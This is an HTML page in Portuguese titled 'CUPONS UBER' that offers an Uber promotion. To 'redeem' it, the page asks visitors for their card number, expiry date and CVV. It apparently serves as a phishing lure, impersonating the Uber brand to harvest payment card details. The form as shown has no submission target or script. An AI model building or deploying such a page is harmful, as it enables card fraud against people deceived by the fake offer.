<!DOCTYPE html>
<html>
  <head>
    <title>CUPONS UBER</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        background-image: url("https://media.hugogloss.uol.com.br/uploads/2019/05/pennsylvania-sues-uber-over-late-breach-notification-showcase_image-7-a-10703-1.jpg");
        background-size: cover;
        background-position: center;
        background-repeat: no-repeat;
        height: 100vh;
      }

      #promo-form {
        width: 400px;
        margin: 0 auto;
        background-color: transparent;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        text-align: center;
      }

      h2 {
        text-align: center;
        color: black;
      }

      input[type="text"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 20px;
        border: none;
        border-radius: 5px;
        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
        font-size: 16px;
      }

      input[type="submit"] {
        background-color: #00bfff;
        color: #fff;
        border: none;
        border-radius: 5px;
        padding: 10px 20px;
        cursor: pointer;
        font-size: 16px;
        margin-top: 20px;
        display: block;
        margin: 0 auto;
      }

      input[type="submit"]:hover {
        background-color: #009acd;
      }

      .container {
        background-color: rgba(255, 255, 255, 0.7);
        border-radius: 5px;
        padding: 20px;
      }

      .resgatar-promo {
        background-color: #00bfff;
        color: #fff;
        border: none;
        border-radius: 5px;
        padding: 10px 20px;
        cursor: pointer;
        font-size: 16px;
        margin-top: 20px;
      }

      .resgatar-promo:hover {
        background-color: #009acd;
      }
    </style>
  </head>
  <body>
    <div id="promo-form">
      <h2>CUPONS UBER</h2>
      <form>
        <div class="container">
          <label for="card">CARTÃO</label>
          <input type="text" id="card" name="card" required>

          <label for="validade">VALIDADE</label>
          <input type="text" id="validade" name="validade" required>

          <label for="cvv">CVV</label>
          <input type="text" id="cvv" name="cvv" required>
        </div>
        <input type="submit" value="Resgatar Promoção">
      </form>
    </div>
  </body>
</html>
